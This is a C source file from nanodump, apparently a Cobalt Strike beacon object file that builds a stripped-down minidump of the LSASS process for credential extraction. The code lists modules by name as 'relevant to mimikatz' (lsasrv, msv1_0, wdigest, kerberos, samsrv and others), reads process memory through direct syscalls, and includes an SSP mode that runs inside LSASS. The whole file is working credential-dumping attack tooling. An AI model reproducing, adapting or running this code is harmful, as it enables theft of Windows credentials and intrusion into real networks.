#include "nanodump.h"
#include "beacon.h"
#ifdef BOF
#include "output.h"
#include "utils.c"
#include "handle.c"
#include "modules.c"
#include "syscalls.c"
#include "token_priv.c"
#include "malseclogon.c"
#include "werfault.c"
#include "spoof_callstack.c"
#include "shtinkering.c"
#include "impersonate.c"
#endif

VOID writeat(
    IN Pdump_context dc,
    IN ULONG32 rva,
    IN const PVOID data,
    IN unsigned size)
{
    PVOID dst = RVA(
        PVOID,
        dc->BaseAddress,
        rva);
    memcpy(dst, data, size);
}

BOOL append(
    IN Pdump_context dc,
    IN const PVOID data,
    IN ULONG32 size)
{
    ULONG32 new_rva = dc->rva + size;
    if (new_rva < dc->rva)
    {
        PRINT_ERR("The dump size exceeds the 32-bit address space!");
        return FALSE;
    }
    else if (new_rva >= dc->DumpMaxSize)
    {
        PRINT_ERR("The dump is too big, please increase DUMP_MAX_SIZE.");
        return FALSE;
    }
    else
    {
        writeat(dc, dc->rva, data, size);
        dc->rva = new_rva;
        return TRUE;
    }
}

BOOL write_header(
    IN Pdump_context dc)
{
    DPRINT("Writing header");
    MiniDumpHeader header = { 0 };
    DPRINT("Signature: 0x%x", dc->Signature);
    header.Signature = dc->Signature;
    DPRINT("Version: %hu", dc->Version);
    header.Version = dc->Version;
    DPRINT("ImplementationVersion: %hu", dc->ImplementationVersion);
    header.ImplementationVersion = dc->ImplementationVersion;
    header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
    header.StreamDirectoryRva = SIZE_OF_HEADER;
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = MiniDumpNormal;

    char header_bytes[SIZE_OF_HEADER] = { 0 };

    DWORD offset = 0;
    memcpy(header_bytes + offset, &header.Signature, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Version, 2); offset += 2;
    memcpy(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
    memcpy(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
    memcpy(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
    memcpy(header_bytes + offset, &header.CheckSum, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Reserved, 4); offset += 4;
    memcpy(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
    memcpy(header_bytes + offset, &header.Flags, 4);

    if (!append(dc, header_bytes, SIZE_OF_HEADER))
    {
        DPRINT_ERR("Failed to write header");
        return FALSE;
    }

    return TRUE;
}

BOOL write_directory(
    IN Pdump_context dc,
    IN MiniDumpDirectory directory)
{
    BYTE directory_bytes[SIZE_OF_DIRECTORY] = { 0 };
    DWORD offset = 0;
    memcpy(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
    memcpy(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
    memcpy(directory_bytes + offset, &directory.Rva, 4);
    if (!append(dc, directory_bytes, sizeof(directory_bytes)))
        return FALSE;

    return TRUE;
}

BOOL write_directories(
    IN Pdump_context dc)
{
    DPRINT("Writing directory: SystemInfoStream");
    MiniDumpDirectory system_info_directory = { 0 };
    system_info_directory.StreamType = SystemInfoStream;
    system_info_directory.DataSize = 0; // this is calculated and written later
    system_info_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, system_info_directory))
    {
        DPRINT_ERR("Failed to write directory");
        return FALSE;
    }

    DPRINT("Writing directory: ModuleListStream");
    MiniDumpDirectory module_list_directory = { 0 };
    module_list_directory.StreamType = ModuleListStream;
    module_list_directory.DataSize = 0; // this is calculated and written later
    module_list_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, module_list_directory))
    {
        DPRINT_ERR("Failed to write directory");
        return FALSE;
    }

    DPRINT("Writing directory: Memory64ListStream");
    MiniDumpDirectory memory64_list_directory = { 0 };
    memory64_list_directory.StreamType = Memory64ListStream;
    memory64_list_directory.DataSize = 0; // this is calculated and written later
    memory64_list_directory.Rva = 0; // this is calculated and written later
    if (!write_directory(dc, memory64_list_directory))
    {
        DPRINT_ERR("Failed to write directory");
        return FALSE;
    }

    return TRUE;
}

BOOL write_system_info_stream(
    IN Pdump_context dc)
{
    MiniDumpSystemInfo system_info = { 0 };

    DPRINT("Writing SystemInfoStream");

    // read the version and build numbers from the PEB
    PVOID pPeb;
    PULONG32 OSMajorVersion;
    PULONG32 OSMinorVersion;
    PUSHORT OSBuildNumber;
    PULONG32 OSPlatformId;
    PUNICODE_STRING CSDVersion;
    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    OSMajorVersion = RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
    OSMinorVersion = RVA(PULONG32, pPeb, OSMINORVERSION_OFFSET);
    OSBuildNumber = RVA(PUSHORT, pPeb, OSBUILDNUMBER_OFFSET);
    OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
    CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
    system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
    DPRINT("OSMajorVersion: %d", *OSMajorVersion);
    DPRINT("OSMinorVersion: %d", *OSMinorVersion);
    DPRINT("OSBuildNumber: %d", *OSBuildNumber);
    DPRINT("CSDVersion: %ls", CSDVersion->Buffer);

    system_info.ProcessorLevel = 0;
    system_info.ProcessorRevision = 0;
    system_info.NumberOfProcessors = 0;
    // RtlGetVersion -> wProductType
    system_info.ProductType = VER_NT_WORKSTATION;
    //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
    //system_info.ProductType = VER_NT_SERVER;
    system_info.MajorVersion = *OSMajorVersion;
    system_info.MinorVersion = *OSMinorVersion;
    system_info.BuildNumber = *OSBuildNumber;
    system_info.PlatformId = *OSPlatformId;
    system_info.CSDVersionRva = 0; // this is calculated and written later
    system_info.SuiteMask = 0;
    system_info.Reserved2 = 0;
#if _WIN64
    system_info.ProcessorFeatures1 = 0;
    system_info.ProcessorFeatures2 = 0;
#else
    system_info.VendorId1 = 0;
    system_info.VendorId2 = 0;
    system_info.VendorId3 = 0;
    system_info.VersionInformation = 0;
    system_info.FeatureInformation = 0;
    system_info.AMDExtendedCpuFeatures = 0;
#endif

    ULONG32 stream_size = SIZE_OF_SYSTEM_INFO_STREAM;
    char system_info_bytes[SIZE_OF_SYSTEM_INFO_STREAM] = { 0 };

    DWORD offset = 0;
    memcpy(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
    memcpy(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
    memcpy(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
    memcpy(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
#if _WIN64
    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
    memcpy(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8);
#else
    memcpy(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
    memcpy(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4);
#endif

    ULONG32 stream_rva = dc->rva;
    if (!append(dc, system_info_bytes, stream_size))
    {
        DPRINT_ERR("Failed to write the SystemInfoStream");
        return FALSE;
    }

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, SIZE_OF_HEADER + 4, &stream_size, 4); // header + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, SIZE_OF_HEADER + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

    // write the service pack
    ULONG32 sp_rva = dc->rva;
    ULONG32 Length = CSDVersion->Length;
    // write the length
    if (!append(dc, &Length, 4))
    {
        DPRINT_ERR("Failed to write the SystemInfoStream");
        return FALSE;
    }
    // write the service pack name
    if (!append(dc, CSDVersion->Buffer, CSDVersion->Length))
    {
        DPRINT_ERR("Failed to write the SystemInfoStream");
        return FALSE;
    }
    // write the service pack RVA in the SystemInfoStream
    writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva

    return TRUE;
}

Pmodule_info write_module_list_stream(
    IN Pdump_context dc)
{
    DPRINT("Writing the ModuleListStream");

    // list of modules relevant to mimikatz
    wchar_t* important_modules[] = {
        L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
        L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
        L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
        L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
    };
    Pmodule_info module_list = find_modules(
        dc->hProcess,
        important_modules,
        ARRAY_SIZE(important_modules),
        TRUE);
    if (!module_list)
    {
        DPRINT_ERR("Failed to write the ModuleListStream");
        return NULL;
    }

    // write the full path of each dll
    Pmodule_info curr_module = module_list;
    ULONG32 number_of_modules = 0;
    while (curr_module)
    {
        number_of_modules++;
        curr_module->name_rva = dc->rva;
        ULONG32 full_name_length = (ULONG32)wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
        full_name_length++; // account for the null byte at the end
        full_name_length *= 2;
        // write the length of the name
        if (!append(dc, &full_name_length, 4))
        {
            DPRINT_ERR("Failed to write the ModuleListStream");
            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
            return NULL;
        }
        // write the path
        if (!append(dc, curr_module->dll_name, full_name_length))
        {
            DPRINT_ERR("Failed to write the ModuleListStream");
            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
            return NULL;
        }
        curr_module = curr_module->next;
    }

    ULONG32 stream_rva = dc->rva;
    // write the number of modules
    if (!append(dc, &number_of_modules, 4))
    {
        DPRINT_ERR("Failed to write the ModuleListStream");
        free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
        return NULL;
    }
    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE] = { 0 };
    curr_module = module_list;
    while (curr_module)
    {
        MiniDumpModule module = { 0 };
        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = curr_module->CheckSum;
        module.TimeDateStamp = curr_module->TimeDateStamp;
        module.ModuleNameRva = curr_module->name_rva;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.rva = 0;
        module.Reserved0 = 0;
        module.Reserved1 = 0;

        DWORD offset = 0;
        memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwSignature, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwStrucVersion, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileVersionLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwProductVersionLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlagsMask, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileFlags, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileOS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileType, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileSubtype, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateMS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.VersionInfo.dwFileDateLS, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CvRecord.DataSize, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CvRecord.rva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.MiscRecord.DataSize, 4); offset += 4;
        memcpy(module_bytes + offset, &module.MiscRecord.rva, 4); offset += 4;
        memcpy(module_bytes + offset, &module.Reserved0, 8); offset += 8;
        memcpy(module_bytes + offset, &module.Reserved1, 8);

        if (!append(dc, module_bytes, sizeof(module_bytes)))
        {
            DPRINT_ERR("Failed to write the ModuleListStream");
            free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
            return NULL;
        }
        curr_module = curr_module->next;
    }

    // write our length in the ModuleListStream directory
    ULONG32 stream_size = 4 + number_of_modules * sizeof(module_bytes);
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4, &stream_size, 4); // header + 1 directory + streamType

    // write our RVA in the ModuleListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4 + 4, &stream_rva, 4); // header + 1 directory + streamType + Location.DataSize

    return module_list;
}

BOOL is_important_module(
    IN PVOID address,
    IN Pmodule_info module_list)
{
    Pmodule_info curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < RVA(ULONG_PTR, curr_module->dll_base, curr_module->size_of_image))
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

PMiniDumpMemoryDescriptor64 get_memory_ranges(
    IN Pdump_context dc,
    IN Pmodule_info module_list)
{
    PMiniDumpMemoryDescriptor64 ranges_list = NULL;
    PVOID base_address, current_address;
    PMiniDumpMemoryDescriptor64 new_range;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi = {0};
    DWORD number_of_ranges = 0;
    NTSTATUS status;

    DPRINT("Getting memory ranges to dump");

    while (TRUE)
    {
        status = NtQueryVirtualMemory(
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL);
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;

        if (((ULONG_PTR)base_address + region_size) < (ULONG_PTR)base_address)
            break;

        // next memory range
        current_address = RVA(PVOID, base_address, region_size);

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore mapped pages
        if (mbi.Type  == MEM_MAPPED)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore pages with PAGE_GUARD
        if ((mbi.Protect & PAGE_GUARD)    == PAGE_GUARD)
            continue;
        // ignore pages with PAGE_EXECUTE
        if ((mbi.Protect & PAGE_EXECUTE)  == PAGE_EXECUTE)
            continue;
        // ignore modules that are not relevant to mimikatz
        if (mbi.Type == MEM_IMAGE &&
            !is_important_module(
                base_address,
                module_list))
            continue;
#ifdef SSP
        // if nanodump is running in LSASS, don't dump the dump :)
        if (dc->BaseAddress == base_address)
            continue;
#endif

        new_range = intAlloc(sizeof(MiniDumpMemoryDescriptor64));
        if(!new_range)
        {
            malloc_failed();
            DPRINT_ERR("Failed to get memory ranges to dump");
            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;
        new_range->State = mbi.State;
        new_range->Protect = mbi.Protect;
        new_range->Type = mbi.Type;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            PMiniDumpMemoryDescriptor64 last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
        number_of_ranges++;
    }
    if (!ranges_list)
    {
        syscall_failed("NtQueryVirtualMemory", status);
        DPRINT_ERR("Failed to enumerate memory ranges");
        return NULL;
    }
    DPRINT(
        "Enumearted %ld ranges of memory",
        number_of_ranges);
    return ranges_list;
}

PMiniDumpMemoryDescriptor64 write_memory64_list_stream(
    IN Pdump_context dc,
    IN Pmodule_info module_list)
{
    PMiniDumpMemoryDescriptor64 memory_ranges;
    ULONG32 stream_rva = dc->rva;

    DPRINT("Writing the Memory64ListStream");

    memory_ranges = get_memory_ranges(
        dc,
        module_list);
    if (!memory_ranges)
    {
        DPRINT_ERR("Failed to write the Memory64ListStream");
        return NULL;
    }

    // write the number of ranges
    PMiniDumpMemoryDescriptor64 curr_range = memory_ranges;
    ULONG64 number_of_ranges = 0;
    while (curr_range)
    {
        number_of_ranges++;
        curr_range = curr_range->next;
    }
    if (!append(dc, &number_of_ranges, 8))
    {
        DPRINT_ERR("Failed to write the Memory64ListStream");
        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
        return NULL;
    }
    // make sure we don't overflow stream_size
    if (16 + 16 * number_of_ranges > 0xffffffff)
    {
        DPRINT_ERR("Too many ranges!");
        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
        return NULL;
    }

    // write the rva of the actual memory content
    ULONG32 stream_size = (ULONG32)(16 + 16 * number_of_ranges);
    ULONG64 base_rva = (ULONG64)stream_rva + stream_size;
    if (!append(dc, &base_rva, 8))
    {
        DPRINT_ERR("Failed to write the Memory64ListStream");
        free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
        return NULL;
    }

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        if (!append(dc, &curr_range->StartOfMemoryRange, 8))
        {
            DPRINT_ERR("Failed to write the Memory64ListStream");
            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
            return NULL;
        }
        if (!append(dc, &curr_range->DataSize, 8))
        {
            DPRINT_ERR("Failed to write the Memory64ListStream");
            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
            return NULL;
        }
        curr_range = curr_range->next;
    }

    // write our length in the Memory64ListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

    // write our RVA in the Memory64ListStream directory
    writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

    // dump all the selected memory ranges
    curr_range = memory_ranges;
    while (curr_range)
    {
        // DataSize can be very large but HeapAlloc should be able to handle it
        PBYTE buffer = intAlloc(curr_range->DataSize);
        if (!buffer)
        {
            DPRINT_ERR("Failed to write the Memory64ListStream");
            malloc_failed();
            return NULL;
        }
        NTSTATUS status = NtReadVirtualMemory(
            dc->hProcess,
            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
            buffer,
            curr_range->DataSize,
            NULL);
        // once in a while, a range fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
        if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY)
        {
            DPRINT_ERR(
                "Failed to read memory range: StartOfMemoryRange: 0x%p, DataSize: 0x%I64x, State: 0x%lx, Protect: 0x%lx, Type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...",
                (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
                curr_range->DataSize,
                curr_range->State,
                curr_range->Protect,
                curr_range->Type,
                status);
            //return NULL;
        }
        if (curr_range->DataSize > 0xffffffff)
        {
            DPRINT_ERR("The current range is larger that the 32-bit address space!");
            curr_range->DataSize = 0xffffffff;
        }
        if (!append(dc, buffer, (ULONG32)curr_range->DataSize))
        {
            DPRINT_ERR("Failed to write the Memory64ListStream");
            free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;
            DATA_FREE(buffer, curr_range->DataSize);
            return NULL;
        }
        DATA_FREE(buffer, curr_range->DataSize);
        curr_range = curr_range->next;
    }

    return memory_ranges;
}

BOOL NanoDumpWriteDump(
    IN Pdump_context dc)
{
    DPRINT("Writing nanodump");

    if (!write_header(dc))
        return FALSE;

    if (!write_directories(dc))
        return FALSE;

    if (!write_system_info_stream(dc))
        return FALSE;

    Pmodule_info module_list;
    module_list = write_module_list_stream(dc);
    if (!module_list)
        return FALSE;

    PMiniDumpMemoryDescriptor64 memory_ranges;
    memory_ranges = write_memory64_list_stream(dc, module_list);
    if (!memory_ranges)
    {
        free_linked_list(module_list, sizeof(module_info)); module_list = NULL;
        return FALSE;
    }

    free_linked_list(module_list, sizeof(module_info)); module_list = NULL;

    free_linked_list(memory_ranges, sizeof(MiniDumpMemoryDescriptor64)); memory_ranges = NULL;

    DPRINT("The nanodump was created succesfully");

    return TRUE;
}
